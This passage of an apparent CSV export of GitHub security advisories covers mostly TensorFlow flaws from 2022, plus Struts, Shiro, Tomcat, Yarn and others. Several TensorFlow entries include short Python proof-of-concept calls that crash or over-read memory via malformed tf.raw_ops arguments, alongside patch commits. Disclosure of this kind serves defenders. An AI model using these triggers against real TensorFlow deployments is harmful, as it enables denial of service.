The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2268,20741,tensorflow,GHSA-pfjj-m3jj-9jc9,CVE-2022-21736,https://github.com/advisories/GHSA-pfjj-m3jj-9jc9,high,2022-02-09 23:43:27 UTC,Undefined behavior in `SparseTensorSliceDataset`,"### Impact 
The [implementation of `SparseTensorSliceDataset`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L227-L292) has an undefined behavior: under certain condition it can be made to dereference a `nullptr` value:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseTensorSliceDataset(
  indices=[[]],
  values=[],
  dense_shape=[1,1])
```

The 3 input arguments represent a sparse tensor. However, there are some preconditions that these arguments must satisfy but these are not validated in the implementation.

### Patches
We have patched the issue in GitHub commit [965b97e4a9650495cda5a8c210ef6684b4b9eceb](https://github.com/tensorflow/tensorflow/commit/965b97e4a9650495cda5a8c210ef6684b4b9eceb).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2269,20741,tensorflow,GHSA-87v6-crgm-2gfj,CVE-2022-21735,https://github.com/advisories/GHSA-87v6-crgm-2gfj,moderate,2022-02-10 00:21:32 UTC,Division by zero in Tensorflow,"### Impact 
The [implementation of `FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_max_pool_op.cc#L36-L192) can be made to crash a TensorFlow process via a division by 0:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.FractionalMaxPool(
  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),
  pooling_ratio=[1.0, 1.44, 1.73, 1.0],
  pseudo_random=False,
  overlapping=False,
  deterministic=False,
  seed=0,
  seed2=0,
  name=None)
```

### Patches
We have patched the issue in GitHub commit [ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb](https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2270,20741,tensorflow,GHSA-gcvh-66ff-4mwm,CVE-2022-21734,https://github.com/advisories/GHSA-gcvh-66ff-4mwm,moderate,2022-02-10 00:21:12 UTC,`CHECK`-failures in Tensorflow,"### Impact 
The [implementation of `MapStage`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/map_stage_op.cc#L519-L550) is vulnerable a `CHECK`-fail if the key tensor is not a scalar:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.MapStage(
    key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),
    indices = np.array([[6]]),
    values = np.array([-60]),
    dtypes = [tf.int64], capacity=0, memory_limit=0,
    container='', shared_name='', name=None
)   
``` 

### Patches
We have patched the issue in GitHub commit [f57315566d7094f322b784947093406c2aea0d7d](https://github.com/tensorflow/tensorflow/commit/f57315566d7094f322b784947093406c2aea0d7d).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.
~                                                                                             ",pip
2271,20741,tensorflow,GHSA-98j8-c9q4-r38g,CVE-2022-21733,https://github.com/advisories/GHSA-98j8-c9q4-r38g,moderate,2022-02-10 00:20:51 UTC,Memory exhaustion in Tensorflow,"### Impact 
The [implementation of `StringNGrams`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/string_ngrams_op.cc#L29-L161) can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:

```python
import tensorflow as tf

tf.raw_ops.StringNGrams(
  data=['123456'],
  data_splits=[0,1],
  separator='a'*15,
  ngram_widths=[],
  left_pad='',
  right_pad='',
  pad_width=-5, 
  preserve_short_sequences=True)
```

We are missing a validation on `pad_witdh` and that result in computing a negative value for `ngram_width` which is later used to allocate parts of the output.

### Patches
We have patched the issue in GitHub commit [f68fdab93fb7f4ddb4eb438c8fe052753c9413e8](https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2272,20741,tensorflow,GHSA-c582-c96p-r5cq,CVE-2022-21732,https://github.com/advisories/GHSA-c582-c96p-r5cq,moderate,2022-02-10 00:20:29 UTC,Memory exhaustion in Tensorflow,"### Impact 
The [implementation of `ThreadPoolHandle`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc#L79-L135) can be used to trigger a denial of service attack by allocating too much memory:

```python
import tensorflow as tf
y = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name='tf')
```

This is because the `num_threads` argument is only checked to not be negative, but there is no upper bound on its value.
    
### Patches
We have patched the issue in GitHub commit [e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e](https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2273,20741,tensorflow,GHSA-m4hf-j54p-p353,CVE-2022-21731,https://github.com/advisories/GHSA-m4hf-j54p-p353,moderate,2022-02-10 00:19:50 UTC,Type confusion leading to segfault in Tensorflow,"### Impact 
The [implementation of shape inference for `ConcatV2`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/common_shape_fns.cc#L1961-L2059) can be used to trigger a denial of service attack via a segfault caused by a type confusion:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ConcatV2(
    values=[[1,2,3],[4,5,6]],
    axis = 0xb500005b)
  return y

test()
```

The `axis` argument is translated into `concat_dim` in the `ConcatShapeHelper` helper function. Then, a value for `min_rank` is computed based on `concat_dim`. This is then used to validate that the `values` tensor has at least the required rank:

```cc
  int64_t concat_dim;
  if (concat_dim_t->dtype() == DT_INT32) {
    concat_dim = static_cast<int64_t>(concat_dim_t->flat<int32>()(0));
  } else {
    concat_dim = concat_dim_t->flat<int64_t>()(0);
  }

  // Minimum required number of dimensions.
  const int min_rank = concat_dim < 0 ? -concat_dim : concat_dim + 1;

  // ...
  ShapeHandle input = c->input(end_value_index - 1);
  TF_RETURN_IF_ERROR(c->WithRankAtLeast(input, min_rank, &input));
```

However, [`WithRankAtLeast`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.cc#L345-L358) receives the lower bound as a 64-bits value and then compares it against the maximum 32-bits integer value that could be represented:

```cc
Status InferenceContext::WithRankAtLeast(ShapeHandle shape, int64_t rank,
                                         ShapeHandle* out) {
  if (rank > kint32max) {
    return errors::InvalidArgument(""Rank cannot exceed kint32max"");
  }
  // ...
}
```

Due to the fact that `min_rank` is a 32-bits value and the value of `axis`, the `rank` argument is a [negative value](https://godbolt.org/z/Gcr5haMob), so the error check is bypassed.

### Patches
We have patched the issue in GitHub commit [08d7b00c0a5a20926363849f611729f53f3ec022](https://github.com/tensorflow/tensorflow/commit/08d7b00c0a5a20926363849f611729f53f3ec022).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2274,20741,tensorflow,GHSA-vjg4-v33c-ggc4,CVE-2022-21730,https://github.com/advisories/GHSA-vjg4-v33c-ggc4,high,2022-02-09 18:29:45 UTC,Out of bounds read in Tensorflow,"### Impact 
The [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.FractionalAvgPoolGrad(
    orig_input_tensor_shape=[2,2,2,2],
    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],
    row_pooling_sequence=[-10,1,2,3],
    col_pooling_sequence=[1,2,3,4],
    overlapping=True)
  return y
    
test()
```

### Patches
We have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2275,20741,tensorflow,GHSA-34f9-hjfq-rr8j,CVE-2022-21729,https://github.com/advisories/GHSA-34f9-hjfq-rr8j,moderate,2022-02-10 00:18:53 UTC,Overflow and uncaught divide by zero in Tensorflow,"### Impact 
The [implementation of `UnravelIndex`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/unravel_index_op.cc#L36-L135) is vulnerable to a division by zero caused by an integer overflow bug:

```python
import tensorflow as tf

tf.raw_ops.UnravelIndex(indices=-0x100000,dims=[0x100000,0x100000])
```

### Patches
We have patched the issue in GitHub commit [58b34c6c8250983948b5a781b426f6aa01fd47af](https://github.com/tensorflow/tensorflow/commit/58b34c6c8250983948b5a781b426f6aa01fd47af).
    
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
    
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
    
### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2276,20741,tensorflow,GHSA-6gmv-pjp9-p8w8,CVE-2022-21728,https://github.com/advisories/GHSA-6gmv-pjp9-p8w8,high,2022-02-09 18:29:24 UTC,Out of bounds read in Tensorflow,"### Impact 
The [implementation of shape inference for `ReverseSequence`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L1636-L1671) does not fully validate the value of `batch_dim` and can result in a heap OOB read:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.ReverseSequence(
    input = ['aaa','bbb'],
    seq_lengths = [1,1,1],
    seq_dim = -10,
    batch_dim = -10 )
  return y
    
test()
```

There is a check to make sure the value of `batch_dim` does not go over the rank of the input, but there is no check for negative values:

```cc
  const int32_t input_rank = c->Rank(input);
  if (batch_dim >= input_rank) {
    return errors::InvalidArgument( 
        ""batch_dim must be < input rank: "", batch_dim, "" vs. "", input_rank);
  }
  // ...
  
  DimensionHandle batch_dim_dim = c->Dim(input, batch_dim);
``` 
    
Negative dimensions are allowed in some cases to mimic Python's negative indexing (i.e., indexing from the end of the array), however if the value is too negative then [the implementation of `Dim`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.h#L415-L428) would access elements before the start of an array:

```cc
  DimensionHandle Dim(ShapeHandle s, int64_t idx) {
    if (!s.Handle() || s->rank_ == kUnknownRank) {
      return UnknownDim();
    }
    return DimKnownRank(s, idx);
  } 
·
  static DimensionHandle DimKnownRank(ShapeHandle s, int64_t idx) {
    CHECK_NE(s->rank_, kUnknownRank);
    if (idx < 0) {
      return s->dims_[s->dims_.size() + idx];
    }
    return s->dims_[idx];
  }
```

### Patches
We have patched the issue in GitHub commit [37c01fb5e25c3d80213060460196406c43d31995](https://github.com/tensorflow/tensorflow/commit/37c01fb5e25c3d80213060460196406c43d31995).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2277,20741,tensorflow,GHSA-c6fh-56w7-fvjw,CVE-2022-21727,https://github.com/advisories/GHSA-c6fh-56w7-fvjw,high,2022-02-09 18:29:13 UTC,Integer overflow in Tensorflow,"### Impact 
The [implementation of shape inference for `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034) is vulnerable to an integer overflow weakness:

```python
import tensorflow as tf

input = tf.constant([1,1],dtype=tf.qint32)

@tf.function
def test():
  y = tf.raw_ops.Dequantize(
    input=input,
    min_range=[1.0],
    max_range=[10.0],
    mode='MIN_COMBINED',
    narrow_range=False,
    axis=2**31-1,
    dtype=tf.bfloat16)
  return y

test()
``` 

The `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow:

```cc
  int axis = -1; 
  Status s = c->GetAttr(""axis"", &axis);
  // ...
  if (axis < -1) {
    return errors::InvalidArgument(""axis should be at least -1, got "",
                                   axis);
  }
  // ...
  if (axis != -1) {
    ShapeHandle input;
    TF_RETURN_IF_ERROR(c->WithRankAtLeast(c->input(0), axis + 1, &input));
    // ...
  }
```
  
### Patches
We have patched the issue in GitHub commit [b64638ec5ccaa77b7c1eb90958e3d85ce381f91b](https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
      
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2278,20741,tensorflow,GHSA-23hm-7w47-xw72,CVE-2022-21726,https://github.com/advisories/GHSA-23hm-7w47-xw72,high,2022-02-09 18:28:54 UTC,Out of bounds read in Tensorflow,"### Impact 
The [implementation of `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153) does not fully validate the value of `axis` and can result in heap OOB accesses:

```python
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.Dequantize(
    input=tf.constant([1,1],dtype=tf.qint32),
    min_range=[1.0],
    max_range=[10.0],
    mode='MIN_COMBINED',
    narrow_range=False,
    axis=2**31-1,
    dtype=tf.bfloat16)
  return y

test()
```

The `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor:
    
```cc   
  if (axis_ > -1) {
    num_slices = input.dim_size(axis_);
  }
  // ...
  int64_t pre_dim = 1, post_dim = 1;
  for (int i = 0; i < axis_; ++i) {
    pre_dim *= float_output.dim_size(i);
  }
  for (int i = axis_ + 1; i < float_output.dims(); ++i) {
    post_dim *= float_output.dim_size(i);
  }
``` 
      
### Patches
We have patched the issue in GitHub commit [23968a8bf65b009120c43b5ebcceaf52dbc9e943](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943).
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
      
### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2279,20741,tensorflow,GHSA-v3f7-j968-4h5f,CVE-2022-21725,https://github.com/advisories/GHSA-v3f7-j968-4h5f,moderate,2022-02-10 00:15:07 UTC,Division by zero in Tensorflow,"### Impact 
The [estimator for the cost of some convolution operations](https://github.com/tensorflow/tensorflow/blob/ffa202a17ab7a4a10182b746d230ea66f021fe16/tensorflow/core/grappler/costs/op_level_cost_estimator.cc#L189-L198) can be made to execute a division by 0:

```python
import tensorflow as tf

@tf.function
def test():
  y=tf.raw_ops.AvgPoolGrad(
    orig_input_shape=[1,1,1,1],
    grad=[[[[1.0],[1.0],[1.0]]],[[[2.0],[2.0],[2.0]]],[[[3.0],[3.0],[3.0]]]],
    ksize=[1,1,1,1],
    strides=[1,1,1,0],
    padding='VALID',
    data_format='NCHW')
  return y

test()
```

The function fails to check that the stride argument is stricly positive:

```cc
int64_t GetOutputSize(const int64_t input, const int64_t filter,
                      const int64_t stride, const Padding& padding) {
  // Logic for calculating output shape is from GetWindowedOutputSizeVerbose() 
  // function in third_party/tensorflow/core/framework/common_shape_fns.cc.
  if (padding == Padding::VALID) {
    return (input - filter + stride) / stride;
  } else {  // SAME.
    return (input + stride - 1) / stride;
  }
} 
```

Hence, the fix is to add a check for the stride argument to ensure it is valid.

### Patches
We have patched the issue in GitHub commit [3218043d6d3a019756607643cf65574fbfef5d7a](https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",pip
2280,20092,ansible,GHSA-785x-qw4v-6872,CVE-2020-14330,https://github.com/advisories/GHSA-785x-qw4v-6872,moderate,2022-02-09 22:00:08 UTC,Improper Output Neutralization and Improper Encoding or Escaping of Output for Logs in ansible,"An Improper Output Neutralization for Logs flaw was found in Ansible when using the uri module, where sensitive data is exposed to content and json output. This flaw allows an attacker to access the logs or outputs of performed tasks to read keys used in playbooks from other users within the uri module. The highest threat from this vulnerability is to data confidentiality.",pip
2281,34046,org.apache.hadoop:hadoop-common,GHSA-f8vc-wfc8-hxqh,CVE-2020-9492,https://github.com/advisories/GHSA-f8vc-wfc8-hxqh,high,2022-02-09 22:17:38 UTC,Improper Privilege Management in Apache Hadoop,"In Apache Hadoop 3.2.0 to 3.2.1, 3.0.0-alpha1 to 3.1.3, and 2.0.0-alpha to 2.10.0, WebHDFS client might send SPNEGO authorization header to remote URL without proper verification.",maven
2282,33942,org.hibernate:hibernate-core,GHSA-j8jw-g6fq-mp7h,CVE-2020-25638,https://github.com/advisories/GHSA-j8jw-g6fq-mp7h,high,2022-02-09 22:57:29 UTC,SQL injection in hibernate-core,"""A flaw was found in hibernate-core in versions prior to and including 5.4.23.Final. A SQL injection in the implementation of the JPA Criteria API can permit unsanitized literals when a literal is used in the SQL comments of the query. This flaw could allow an attacker to access unauthorized information or possibly conduct further attacks. The highest threat from this vulnerability is to data confidentiality and integrity.""",maven
2283,34974,org.apache.struts:struts2-core,GHSA-jc35-q369-45pv,CVE-2020-17530,https://github.com/advisories/GHSA-jc35-q369-45pv,critical,2022-02-09 22:51:56 UTC,Remote code execution in Apache Struts,"Forced OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.",maven
2284,16827,yarn,GHSA-hjxc-462x-x77j,CVE-2019-15608,https://github.com/advisories/GHSA-hjxc-462x-x77j,moderate,2022-02-09 22:49:38 UTC,TOCTOU Race Condition in Yarn,The package integrity validation in yarn &lt; 1.19.0 contains a TOCTOU vulnerability where the hash is computed before writing a package to cache. It&#39;s not computed again when reading from the cache. This may lead to a cache pollution attack. This issue is fixed in 1.19.0.,npm
2285,17510,ua-parser-js,GHSA-394c-5j6w-4xmx,CVE-2020-7793,https://github.com/advisories/GHSA-394c-5j6w-4xmx,high,2022-02-09 22:46:53 UTC,ua-parser-js Regular Expression Denial of Service vulnerability,The package ua-parser-js before 0.7.23 are vulnerable to Regular Expression Denial of Service (ReDoS) in multiple regexes (see linked commit for more info).,npm
2286,16827,yarn,GHSA-8mfc-v7wv-p62g,CVE-2020-8131,https://github.com/advisories/GHSA-8mfc-v7wv-p62g,high,2022-02-09 22:43:37 UTC,Path Traversal in Yarn,Arbitrary filesystem write vulnerability in Yarn 1.21.1 and earlier allows attackers to write to any path on the filesystem and potentially lead to arbitrary code execution by forcing the user to install a malicious package.,npm
2287,37470,org.apache.accumulo:accumulo-core,GHSA-grc3-8q8m-4j7c,CVE-2020-17533,https://github.com/advisories/GHSA-grc3-8q8m-4j7c,high,2022-02-09 22:37:59 UTC,Improper privilege handling in Apache Accumulo,"Apache Accumulo versions 1.5.0 through 1.10.0 and version 2.0.0 do not properly check the return value of some policy enforcement functions before permitting an authenticated user to perform certain administrative operations. Specifically, the return values of the 'canFlush' and 'canPerformSystemActions' security functions are not checked in some instances, therefore allowing an authenticated user with insufficient permissions to perform the following actions: flushing a table, shutting down Accumulo or an individual tablet server, and setting or removing system-wide Accumulo configuration properties.",maven
2288,36041,org.apache.shiro:shiro-spring,GHSA-v98j-7crc-wvrj,CVE-2020-17523,https://github.com/advisories/GHSA-v98j-7crc-wvrj,critical,2022-02-09 22:03:57 UTC,Authentication bypass in Apache Shiro,"Apache Shiro before 1.7.1, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass.",maven
2289,34679,org.apache.shiro:shiro-web,GHSA-v98j-7crc-wvrj,CVE-2020-17523,https://github.com/advisories/GHSA-v98j-7crc-wvrj,critical,2022-02-09 22:03:57 UTC,Authentication bypass in Apache Shiro,"Apache Shiro before 1.7.1, when using Apache Shiro with Spring, a specially crafted HTTP request may cause an authentication bypass.",maven
2290,20092,ansible,GHSA-f85h-23mf-2fwh,CVE-2020-1738,https://github.com/advisories/GHSA-f85h-23mf-2fwh,moderate,2022-02-09 22:00:04 UTC,Argument Injection in Ansible,"A flaw was found in Ansible Engine when the module package or service is used and the parameter 'use' is not specified. If a previous task is executed with a malicious user, the module sent can be selected by the attacker using the ansible facts file. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.",pip
2291,20092,ansible,GHSA-x7jh-595q-wq82,CVE-2020-1736,https://github.com/advisories/GHSA-x7jh-595q-wq82,low,2022-02-09 21:59:46 UTC,Incorrect Permission Assignment for Critical Resource in Ansible,"A flaw was found in Ansible Engine when a file is moved using atomic_move primitive as the file mode cannot be specified. This sets the destination files world-readable if the destination file does not exist and if the file exists, the file could be changed to have less restrictive permissions before the move. This could lead to the disclosure of sensitive data. All versions in 2.7.x, 2.8.x and 2.9.x branches are believed to be vulnerable.",pip
2292,20092,ansible,GHSA-vp9j-rghq-8jhh,CVE-2020-10744,https://github.com/advisories/GHSA-vp9j-rghq-8jhh,moderate,2022-02-09 21:59:42 UTC,Exposure of Resource to Wrong Sphere and Insecure Temporary File in Ansible,"An incomplete fix was found for the fix of the flaw CVE-2020-1733 ansible insecure temporary directory when running become_user from become directive. The provided fix is insufficient to prevent the race condition on systems using ACLs and FUSE filesystems. Ansible Engine 2.7.18, 2.8.12, and 2.9.9 as well as previous versions are affected and Ansible Tower 3.4.5, 3.5.6 and 3.6.4 as well as previous versions are affected.",pip
2293,20092,ansible,GHSA-j667-c2hm-f2wp,CVE-2020-14332,https://github.com/advisories/GHSA-j667-c2hm-f2wp,moderate,2022-02-09 21:59:39 UTC,Insertion of Sensitive Information into Log File and Improper Output Neutralization for Logs in ansible,A flaw was found in the Ansible Engine when using module_args. Tasks executed with check mode (--check-mode) do not properly neutralize sensitive data exposed in the event data. This flaw allows unauthorized users to read this data. The highest threat from this vulnerability is to confidentiality.,pip
2294,17718,express-handlebars,GHSA-fr76-2wp8-fp92,CVE-2021-32820,https://github.com/advisories/GHSA-fr76-2wp8-fp92,high,2022-02-10 23:35:21 UTC,Insecure template handling in Express-handlebars,"Express-handlebars is a Handlebars view engine for Express. Express-handlebars mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extentions (i.e. file.extension) can be included, files that lack an extension will have .handlebars appended to them. For complete details refer to the referenced GHSL-2021-018 report. Notes in documentation have been added to help users avoid this potential information exposure vulnerability.

A fix is discussed in https://github.com/express-handlebars/express-handlebars/pull/163",npm
2295,36254,org.apache.activemq:artemis-commons,GHSA-pr38-qpxm-g88x,CVE-2022-23913,https://github.com/advisories/GHSA-pr38-qpxm-g88x,high,2022-02-06 00:00:55 UTC,Uncontrolled Resource Consumption in Apache ActiveMQ Artemis,"In Apache ActiveMQ Artemis prior to 2.20.0 or 2.19.1, an attacker could partially disrupt availability (DoS) through uncontrolled resource consumption of memory.",maven
2296,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-vvw4-rfwf-p6hx,CVE-2020-17527,https://github.com/advisories/GHSA-vvw4-rfwf-p6hx,high,2022-02-09 22:58:06 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Tomcat,"While investigating bug 64830 it was discovered that Apache Tomcat 10.0.0-M1 to 10.0.0-M9, 9.0.0-M1 to 9.0.39 and 8.5.0 to 8.5.59 could re-use an HTTP request header value from the previous stream received on an HTTP/2 connection for the request associated with the subsequent stream. While this would most likely lead to an error and the closure of the HTTP/2 connection, it is possible that information could leak between requests.",maven
2297,34495,net.minidev:json-smart,GHSA-fg2v-w576-w4v3,CVE-2021-31684,https://github.com/advisories/GHSA-fg2v-w576-w4v3,high,2022-02-10 22:46:22 UTC,Out of bounds read in json-smart,A vulnerability was discovered in the indexOf function of JSONParserByteArray in JSON Smart versions prior to 1.3.3 and 2.4.5 which causes a denial of service (DOS) via a crafted web request.,maven
2298,15838,karma,GHSA-7x7c-qm48-pq9c,CVE-2022-0437,https://github.com/advisories/GHSA-7x7c-qm48-pq9c,moderate,2022-02-06 00:00:54 UTC,Cross-site Scripting in karma,karma prior to version 6.3.14 contains a cross-site scripting vulnerability.,npm
2299,19862,protobuf,GHSA-77rm-9x9h-xj3g,CVE-2021-22570,https://github.com/advisories/GHSA-77rm-9x9h-xj3g,high,2022-01-27 00:01:15 UTC,NULL Pointer Dereference in Protocol Buffers,"Nullptr dereference when a null char is present in a proto symbol. The symbol is parsed incorrectly, leading to an unchecked call into the proto file's name during generation of the resulting error message. Since the symbol is incorrectly parsed, the file is nullptr. We recommend upgrading to version 3.15.0 or greater.",pip
2300,12977,Google.Protobuf,GHSA-77rm-9x9h-xj3g,CVE-2021-22570,https://github.com/advisories/GHSA-77rm-9x9h-xj3g,high,2022-01-27 00:01:15 UTC,NULL Pointer Dereference in Protocol Buffers,"Nullptr dereference when a null char is present in a proto symbol. The symbol is parsed incorrectly, leading to an unchecked call into the proto file's name during generation of the resulting error message. Since the symbol is incorrectly parsed, the file is nullptr. We recommend upgrading to version 3.15.0 or greater.",nuget
2301,16013,handlebars,GHSA-765h-qjxv-5f44,CVE-2021-23383,https://github.com/advisories/GHSA-765h-qjxv-5f44,critical,2022-02-10 23:51:42 UTC,Prototype Pollution in handlebars,The package handlebars before 4.7.7 are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.,npm
